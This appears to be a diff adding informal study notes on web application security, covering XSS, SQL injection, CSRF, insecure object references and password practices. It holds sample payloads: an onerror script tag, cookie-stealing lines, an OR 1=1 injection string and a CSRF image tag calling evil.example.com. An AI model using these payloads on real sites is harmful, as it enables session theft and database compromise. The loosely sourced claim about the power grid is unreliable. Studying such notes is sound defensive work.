@@ -1,0 +1,74 @@
+Javascript - all client side
+	CSS : web app runs malicious code
+		forums, bad links, emails, edited urls
+		very bad: `document.write(iform.elements.['unsafe'].value`
+		can be done by any site
+		very vulnerable to man-in-the-middle
+		can run in background without being detected
+		
+		bad: <img src='blash' onerror='javascript:malicious code'>
+		worst without escaping characters, unsanitised inputs
+		very worst: password managers, redirects
+		
+			this.src='http://127.0.0.1/?c="cookies"'
+			requests.post('http://127.0.0.1', data=payload, cookies=cookies)
+			
+		good websites have multiple forms of verification
+		bad sites just use cookies
+	
+	SQL inject: allows arbitrary execution on SQL database
+		drop all tables
+		view all tables
+		little bobby tables
+
+		happends when input isn't sanatized, statements aren't encapsulated
+		can also run 'pre-built functions' instead of direct input
+		ex: SELECT * FROM users WHERE email='$email' AND password=md5('xxx') OR 1=1--]');
+
+	CSRF (Cross site request forgery):
+		<img src="http://localhost/gui/?action=add-url&s=http://evil.example.com/backdoor.torrent">
+		youtube was hacked this way, myspace, etc
+
+	Insecure Direct Object references: user gains access they aren't supposed to have
+		path traversal, open redirect, url fuzzing
+		should NOT be /users/sally/images, should be /users/reallylongrandomkey324532432/images
+		otherwise, can type /users/bill/images and get anything
+		
+	Missing Function Level Action control
+		no auth / auth is client-side
+		no internal access control
+	
+	
+	US power grid executes any command
+		no security in mind
+		Symantec reports russia hacked most of our power grid
+	
+	BAD:
+		using known vulnerabilities
+		http
+		predictable cookies
+		no salts
+		shortening passwords (seriously, WTF?)
+		no 2auth
+		no hashing
+		no tokens
+		
+	Mismanagement:
+		Out of data
+		no auth!!
+		logs sent to client
+		clear text
+		md5, sha1
+		clear text!!
+	
+	GOOD:
+		https
+		random long cookies
+		salts
+		infinite passwords
+		2fa
+		
+note: "please don't start a webserver in your root - just - no, please don't do that. You're hurting yourself."
+note: "there's a reason we have experts validate encryption standards: math is hard."
+note: "if you have lots of plus symbols, you're in for a bad time"
+note: try 'correct horse battery staple' on dropbox
